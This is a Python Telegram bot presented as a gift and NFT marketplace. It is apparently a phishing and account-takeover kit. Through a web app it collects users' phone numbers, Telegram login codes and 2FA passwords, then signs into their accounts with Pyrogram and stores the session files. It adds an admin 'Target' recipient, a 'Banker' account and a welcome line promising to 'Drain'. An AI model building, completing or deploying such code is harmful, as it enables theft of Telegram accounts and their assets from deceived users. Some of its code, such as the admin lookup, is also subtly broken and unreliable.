#!/usr/bin/env python3
"""
======================================================================================
                    MARKETPLACE & NFT UNIFIED BOT v2.0
              Объединение авторизации + NFT функционала в один бот
======================================================================================
"""

import asyncio
import logging
import sys
import os
import re
import json
import time
import sqlite3
import secrets
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List, Tuple
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, WebAppInfo,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait, BadRequest, PeerIdInvalid, UsernameInvalid
)

# ================= ЛОГИРОВАНИЕ =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('unified_bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("UnifiedBot")

# ================= НАСТРОЙКИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)

def load_settings() -> dict:
    settings_path = BASE_DIR / "settings.json"
    if settings_path.exists():
        with open(settings_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "site_url" in data and "api_url" not in data:
                data["api_url"] = data["site_url"].rstrip('/')
            return data
    return {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 0)),
        "api_hash": os.getenv("API_HASH", ""),
        "api_url": os.getenv("SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": [],
        "allowed_group_id": None,
        "topic_launch": None,
        "topic_auth": None,
        "topic_success": None,
        "target_user": None
    }

SETTINGS = load_settings()
APP_INSTANCE = None

# ================= СОСТОЯНИЯ FSM =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_api_url = State()

class UserSettingsState(StatesGroup):
    waiting_check_amount = State()

# ================= ХРАНИЛИЩА =================
user_sessions = {}          # { phone: { hash, telegram_id } }
pyrogram_clients = {}       # { phone: Client }
processed_requests = {}     # { requestId: set(actions) }
active_nft_operations = {}  # { phone: { status, progress } }

# ================= АДМИН АВТОРИЗАЦИЯ =================
admin_auth_process = {}

# ================= НАСТРОЙКИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)

# ================= УТИЛИТЫ =================
def clean_phone(phone: str) -> str:
    if not phone:
        return ""
    clean = re.sub(r'\D', '', str(phone))
    if len(clean) == 11 and clean.startswith('8'):
        clean = '7' + clean[1:]
    elif len(clean) == 10:
        clean = '7' + clean
    return '+' + clean if not clean.startswith('+') else clean

def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) >= 4:
        return f"+{clean[0]}***{clean[-2:]}"
    return clean

def get_webapp_url(user_id: int) -> str:
    base = SETTINGS['api_url'].rstrip('/')
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"

def is_request_processed(req_id: str, action: str) -> bool:
    return req_id in processed_requests and action in processed_requests[req_id]

def mark_request_processed(req_id: str, action: str):
    if req_id not in processed_requests:
        processed_requests[req_id] = set()
    processed_requests[req_id].add(action)

def save_settings():
    settings_path = BASE_DIR / "settings.json"
    with open(settings_path, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=2, ensure_ascii=False)

# ================= БАЗА ДАННЫХ =================
class UnifiedDatabase:
    def __init__(self, db_file="unified_bot.db"):
        self.conn = sqlite3.connect(str(BASE_DIR / db_file))
        self.cursor = self.conn.cursor()
        self.create_tables()

    def create_tables(self):
        # Пользователи
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance INTEGER DEFAULT 0,
            stars_balance INTEGER DEFAULT 0,
            is_authorized BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        # Операции NFT
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS nft_operations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            operation_type TEXT,
            gift_id TEXT,
            amount INTEGER,
            status TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        # Чеки
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS checks (
            check_id TEXT PRIMARY KEY,
            creator_id INTEGER,
            amount INTEGER,
            activations INTEGER,
            claimed_count INTEGER DEFAULT 0,
            claimed_by TEXT DEFAULT ''
        )""")
        
        # Админ действия
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS admin_actions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            action TEXT,
            target_id TEXT,
            details TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        self.conn.commit()

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        if not row:
            return None
        return {
            'user_id': row[0], 'username': row[1], 'first_name': row[2],
            'phone': row[3], 'balance': row[4], 'stars_balance': row[5],
            'is_authorized': bool(row[6]), 'created_at': row[7]
        }

    def add_user(self, user_id, username, first_name, phone=None):
        user = self.get_user(user_id)
        if not user:
            self.cursor.execute(
                "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                (user_id, username or "Unknown", first_name or "Unknown", phone)
            )
        else:
            self.cursor.execute(
                "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                (username or "Unknown", first_name or "Unknown", phone, user_id)
            )
        self.conn.commit()

    def mark_authorized(self, user_id, phone):
        self.cursor.execute(
            "UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?",
            (phone, user_id)
        )
        self.conn.commit()

    def update_balance(self, user_id, amount, mode='add'):
        user = self.get_user(user_id)
        if not user:
            self.add_user(user_id, "Unknown", "Unknown")
            user = self.get_user(user_id)
        
        current = user['balance']
        new = current + amount if mode == 'add' else max(0, current - amount)
        self.cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new, user_id))
        self.conn.commit()
        return new

    def log_nft_operation(self, user_id, op_type, gift_id, amount, status):
        self.cursor.execute(
            "INSERT INTO nft_operations (user_id, operation_type, gift_id, amount, status) VALUES (?, ?, ?, ?, ?)",
            (user_id, op_type, gift_id, amount, status)
        )
        self.conn.commit()

    def log_admin_action(self, admin_id, action, target_id, details):
        self.cursor.execute(
            "INSERT INTO admin_actions (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
            (admin_id, action, target_id, details)
        )
        self.conn.commit()

    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
        users = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT SUM(balance) FROM users")
        checks = self.cursor.fetchone()[0] or 0
        return users, checks

    def get_admins(self):
        self.cursor.execute("SELECT tg_id FROM admin_actions WHERE action = 'admin_login'")
        admins = self.cursor.fetchall()
        return [{'tg_id': admin[0]} for admin in admins]

db = UnifiedDatabase()

# ================= РОУТЕР =================
def get_router(bot: Bot) -> Router:
    router = Router()

    async def check_admin(user_id):
        return user_id in SETTINGS.get("admin_ids", [])

    @router.message(CommandStart())
    async def cmd_start(msg: types.Message):
        uid = msg.from_user.id
        user = db.get_user(uid)
        
        if user and user['is_authorized']:
            text = (
                f"👋 <b>Welcome back, {msg.from_user.first_name}!</b>\n\n"
                f"📱 Phone: {mask_phone(user['phone'])}\n"
                f"💰 Balance: {user['balance']} USDT\n"
                f"⭐ Stars: {user['stars_balance']}\n\n"
                f"🎁 Choose an action:"
            )
        else:
            text = (
                "🎁 <b>Welcome to Gift Marketplace v2!</b>\n\n"
                "The ultimate marketplace for Telegram gifts and NFTs\n\n"
                "📍 Buy • Sell • Trade • Drain"
            )

        db.add_user(uid, msg.from_user.username, msg.from_user.first_name)

        kb = InlineKeyboardBuilder()
        url = get_webapp_url(uid)
        kb.row(InlineKeyboardButton(text="🌀 Open Dashboard", web_app=WebAppInfo(url=url)))
        
        if user and user['is_authorized']:
            kb.row(InlineKeyboardButton(text="🚀 NFT Tools", callback_data="nft_menu"))
            kb.row(InlineKeyboardButton(text="💳 Manage Account", callback_data="account_menu"))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.message(Command("admin"))
    async def cmd_admin(msg: types.Message):
        uid = msg.from_user.id
        
        if not await check_admin(uid):
            await msg.answer("❌ Access denied")
            logger.info(f"🚫 Unauthorized admin access attempt from {uid}")
            return

        u, total = db.get_stats()
        txt = (
            f"👑 <b>ADMIN PANEL</b>\n\n"
            f"👥 Users: <b>{u}</b>\n"
            f"💸 Balance: <b>{total} USDT</b>\n"
            f"🔗 API: {SETTINGS['api_url']}"
        )
        
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📊 Stats", callback_data="admin_stats"))
        kb.row(InlineKeyboardButton(text="👤 Users", callback_data="admin_users"))
        kb.row(InlineKeyboardButton(text="⚙️ Settings", callback_data="admin_settings"))
        kb.row(InlineKeyboardButton(text="🎯 Target", callback_data="set_target"))
        kb.row(InlineKeyboardButton(text="📱 Banker", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="🔙 Close", callback_data="close_admin"))
        
        await msg.answer(txt, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "admin_stats")
    async def admin_stats(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        u, total_bal = db.get_stats()
        txt = (
            f"📊 <b>BOT STATISTICS</b>\n\n"
            f"👥 Total Users: <b>{u}</b>\n"
            f"💰 Total Balance: <b>{total_bal} USDT</b>\n"
            f"🔗 API: {SETTINGS['api_url']}\n"
            f"✅ Active: Yes"
        )
        await c.answer(txt, show_alert=True)

    @router.callback_query(F.data == "admin_users")
    async def admin_users(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        txt = "👤 <b>USER MANAGEMENT</b>\n\nSelect action:"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔍 Find User", callback_data="find_user"))
        kb.row(InlineKeyboardButton(text="💰 Add Balance", callback_data="add_balance"))
        kb.row(InlineKeyboardButton(text="🚫 Ban User", callback_data="ban_user"))
        kb.row(InlineKeyboardButton(text="🔙 Back", callback_data="admin_menu"))
        
        await c.message.edit_text(txt, reply_markup=kb.as_markup())

    @router.callback_query(F.data == "admin_settings")
    async def admin_settings(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        txt = "⚙️ <b>SETTINGS</b>\n\nSelect:"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔗 API URL", callback_data="set_api"))
        kb.row(InlineKeyboardButton(text="🆔 API ID", callback_data="set_api_id"))
        kb.row(InlineKeyboardButton(text="🔑 API Hash", callback_data="set_api_hash"))
        kb.row(InlineKeyboardButton(text="🔙 Back", callback_data="admin_menu"))
        
        await c.message.edit_text(txt, reply_markup=kb.as_markup())

    @router.callback_query(F.data == "set_target")
    async def set_target_start(c: types.CallbackQuery, state: FSMContext):
        if not await check_admin(c.from_user.id):
            return
        await c.message.delete()
        await c.message.answer("✍️ Enter target user ID or @username:")
        await state.set_state(AdminSettingsState.waiting_target)

    @router.message(AdminSettingsState.waiting_target)
    async def set_target_fin(msg: types.Message, state: FSMContext):
        SETTINGS['target_user'] = msg.text.strip()
        save_settings()
        db.log_admin_action(msg.from_user.id, "set_target", msg.text, f"Target changed to {msg.text}")
        await msg.answer(f"✅ Target changed to: <b>{msg.text}</b>", parse_mode=ParseMode.HTML)
        await state.clear()

    @router.callback_query(F.data == "admin_login")
    async def admin_login_start(c: types.CallbackQuery, state: FSMContext):
        if not await check_admin(c.from_user.id):
            return
        await c.message.delete()
        await c.message.answer("📱 Enter phone number for Banker account:")
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def admin_phone(msg: types.Message, state: FSMContext):
        phone = clean_phone(msg.text)
        session_name = str(SESSIONS_DIR / phone.replace('+', ''))
        
        try:
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
            await client.connect()
            sent = await client.send_code(phone)
            admin_auth_process[msg.from_user.id] = {
                "client": client,
                "phone": phone,
                "hash": sent.phone_code_hash
            }
            db.log_admin_action(msg.from_user.id, "banker_login_start", phone, "Started banker login")
            await msg.answer("🔢 Enter verification code:")
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            logger.error(f"Banker login error: {e}")
            await msg.answer(f"❌ Error: {str(e)[:100]}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def admin_code(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            return
        
        client = data['client']
        try:
            await client.sign_in(data['phone'], data['hash'], msg.text)
            db.log_admin_action(msg.from_user.id, "banker_login_success", data['phone'], "Banker account authorized")
            await msg.answer("✅ <b>Success!</b> Banker account connected.", parse_mode=ParseMode.HTML)
            await client.disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await msg.answer("🔐 Enter 2FA password:")
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e:
            logger.error(f"Banker code error: {e}")
            await msg.answer(f"❌ Error: {str(e)[:100]}")
            await state.clear()

    @router.message(AdminLoginState.waiting_password)
    async def admin_pass(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            return
        
        client = data['client']
        try:
            await client.check_password(msg.text)
            db.log_admin_action(msg.from_user.id, "banker_login_2fa", data['phone'], "Banker 2FA verified")
            await msg.answer("✅ <b>Success!</b> Banker fully authorized.", parse_mode=ParseMode.HTML)
            await client.disconnect()
            await state.clear()
        except Exception as e:
            logger.error(f"Banker password error: {e}")
            await msg.answer(f"❌ Error: {str(e)[:100]}")
            await state.clear()

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c: types.CallbackQuery):
        await c.message.delete()

    @router.callback_query(F.data == "admin_menu")
    async def admin_menu(c: types.CallbackQuery):
        if not await check_admin(c.from_user.id):
            return
        
        u, total = db.get_stats()
        txt = (
            f"👑 <b>ADMIN PANEL</b>\n\n"
            f"👥 Users: <b>{u}</b>\n"
            f"💸 Balance: <b>{total} USDT</b>\n"
            f"🔗 API: {SETTINGS['api_url']}"
        )
        
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📊 Stats", callback_data="admin_stats"))
        kb.row(InlineKeyboardButton(text="👤 Users", callback_data="admin_users"))
        kb.row(InlineKeyboardButton(text="⚙️ Settings", callback_data="admin_settings"))
        kb.row(InlineKeyboardButton(text="🎯 Target", callback_data="set_target"))
        kb.row(InlineKeyboardButton(text="📱 Banker", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="🔙 Close", callback_data="close_admin"))
        
        await c.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.message(F.contact)
    async def handle_contact(msg: types.Message):
        contact = msg.contact
        telegram_id = msg.from_user.id
        
        logger.info(f"📲 INCOMING CONTACT: TG={telegram_id}, Phone={contact.phone_number}")
        
        if not contact.phone_number:
            logger.warning(f"⚠ Contact has no phone_number")
            return

        phone = clean_phone(contact.phone_number.strip())
        db.add_user(telegram_id, msg.from_user.username, msg.from_user.first_name, phone)

        try:
            async with aiohttp.ClientSession() as session:
                url = f"{SETTINGS['api_url']}/api/telegram/receive-phone"
                payload = {
                    "phone": phone,
                    "telegramId": telegram_id,
                    "timestamp": int(time.time()),
                    "source": "contact"
                }
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    logger.info(f"✅ Phone submitted: Status {resp.status}")
        except Exception as e:
            logger.error(f"❌ Error submitting phone: {e}")

        return True

    return router

# ================= ОСНОВНОЙ КЛАСС =================
class UnifiedBot:
    def __init__(self):
        global APP_INSTANCE
        APP_INSTANCE = self
        self.bot = None
        self.dp = None
        self.api_url = SETTINGS['api_url']
        self.bot_token = SETTINGS['bot_token']

    async def update_status(self, req_id: str, status: str, message: str = None, error: str = None, phone: str = None, telegram_id: str = None):
        """Обновляет статус запроса на сервере"""
        url = f"{self.api_url}/api/telegram/update-request"
        payload = {"requestId": req_id, "status": status, "processed": True}
        if message:
            payload["message"] = message
        if error:
            payload["error"] = error
        if phone:
            payload["phone"] = phone
        if telegram_id:
            payload["telegramId"] = telegram_id

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    logger.info(f"📤 Status update: {status} -> {resp.status}")
        except Exception as e:
            logger.error(f"❌ API error: {e}")

    async def start_api_polling(self):
        """Polling API для получения pending запросов"""
        logger.info(f"📡 API Polling started: {self.api_url}")
        
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    url = f"{self.api_url}/api/telegram/get-pending"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            for req in data.get('requests', []):
                                req_id = req.get('requestId')
                                action = req.get('action')
                                if req_id and action and not is_request_processed(req_id, action):
                                    mark_request_processed(req_id, action)
                                    logger.info(f"📥 New request: {action}")
                                    asyncio.create_task(self.process_request(req))
                except Exception as e:
                    pass
                await asyncio.sleep(2)

    async def process_request(self, req: dict):
        """Обрабатывает запрос авторизации или NFT операции"""
        req_id = req.get('requestId')
        action = req.get('action')
        phone = clean_phone(req.get('phone', ''))
        code = req.get('code')
        password = req.get('password')
        telegram_id = req.get('telegramId') or req.get('chatId')

        logger.info(f"🔄 Processing: {action} | TG: {telegram_id}")

        if not phone and action in ['send_code', 'send_password']:
            for stored_phone, session_data in user_sessions.items():
                if session_data.get('telegram_id') == telegram_id:
                    phone = stored_phone
                    break

        try:
            client = pyrogram_clients.get(phone)

            # ========== SEND_PHONE ==========
            if action == 'send_phone':
                if not phone:
                    logger.error("❌ No phone provided")
                    return

                session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                pyrogram_clients[phone] = client

                try:
                    if not client.is_connected:
                        await client.connect()
                    
                    sent = await client.send_code(phone)
                    user_sessions[phone] = {'hash': sent.phone_code_hash, 'telegram_id': telegram_id}
                    logger.info(f"✅ Code sent to {phone}")
                    await self.update_status(req_id, "waiting_code", "Код отправлен", phone=phone, telegram_id=telegram_id)

                except Exception as e:
                    logger.error(f"❌ send_code error: {e}")
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)
                    if client.is_connected:
                        await client.disconnect()

            # ========== SEND_CODE ==========
            elif action == 'send_code':
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client

                if not client.is_connected:
                    await client.connect()

                session_data = user_sessions.get(phone)
                if not session_data:
                    return await self.update_status(req_id, "error", error="Сессия истекла", phone=phone, telegram_id=telegram_id)

                try:
                    await client.sign_in(phone, session_data['hash'], code)
                    db.mark_authorized(telegram_id, phone)
                    db.log_nft_operation(telegram_id, "auth", None, 0, "success")
                    await self.update_status(req_id, "success", "Авторизация успешна!", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ Auth success: {phone}")
                    await client.disconnect()
                    user_sessions.pop(phone, None)

                except SessionPasswordNeeded:
                    logger.info(f"🔒 2FA required for {phone}")
                    await self.update_status(req_id, "waiting_password", "Требуется пароль", phone=phone, telegram_id=telegram_id)
                except PhoneCodeInvalid:
                    await self.update_status(req_id, "error", error="Неверный код", phone=phone, telegram_id=telegram_id)
                except Exception as e:
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)

            # ========== SEND_PASSWORD ==========
            elif action == 'send_password':
                logger.info(f"📥 Password action: phone={phone}, telegramId={telegram_id}, requestId={req_id}")
                
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client

                if not client.is_connected:
                    await client.connect()

                try:
                    logger.info(f"🔐 Checking password for {phone}...")
                    await client.check_password(password)
                    db.mark_authorized(telegram_id, phone)
                    db.log_nft_operation(telegram_id, "auth_2fa", None, 0, "success")
                    await self.update_status(req_id, "success", "2FA успешна!", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ 2FA success: {phone}")
                    if client.is_connected:
                        await client.disconnect()
                    user_sessions.pop(phone, None)
                    pyrogram_clients.pop(phone, None)

                except PasswordHashInvalid:
                    error_msg = "Неверный пароль"
                    logger.warning(f"❌ Invalid password for {phone}")
                    await self.update_status(req_id, "invalid_password", error_msg, phone=phone, telegram_id=telegram_id)
                    await self.notify_admins_error(phone, error_msg, telegram_id)
                    
                except Exception as e:
                    error_str = str(e)
                    logger.error(f"❌ Password check error for {phone}: {error_str}")
                    await self.update_status(req_id, "error", error=error_str, phone=phone, telegram_id=telegram_id)
                    await self.notify_admins_error(phone, error_str, telegram_id)

        except Exception as e:
            logger.error(f"❌ Fatal error in process_request: {e}")
            error_str = str(e)
            if phone and telegram_id:
                await self.notify_admins_error(phone, f"Fatal: {error_str}", telegram_id)
            await self.update_status(req_id, "error", error=error_str, phone=phone, telegram_id=telegram_id)

    async def notify_admins_error(self, phone: str, error_msg: str, telegram_id: int):
        """Отправить уведомление об ошибке всем админам"""
        try:
            admins = db.get_admins()
            for admin in admins:
                try:
                    await self.bot.send_message(
                        admin['tg_id'],
                        f"⚠️ <b>Auth Error</b>\n\n"
                        f"📱 Phone: {mask_phone(phone)}\n"
                        f"👤 User: {telegram_id}\n"
                        f"❌ Error: {error_msg}",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logger.error(f"Failed to notify admin {admin['tg_id']}: {e}")
        except Exception as e:
            logger.error(f"Error notifying admins: {e}")

    async def run(self):
        """Запуск бота"""
        if not self.bot_token:
            logger.error("❌ BOT_TOKEN not set!")
            return

        self.bot = Bot(token=self.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.include_router(get_router(self.bot))

        asyncio.create_task(self.start_api_polling())

        bot_info = await self.bot.get_me()
        logger.info(f"🚀 Unified Bot started: @{bot_info.username}")

        await self.dp.start_polling(self.bot)


# ================= MAIN =================
if __name__ == "__main__":
    try:
        bot = UnifiedBot()
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        logger.info("Bot stopped")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
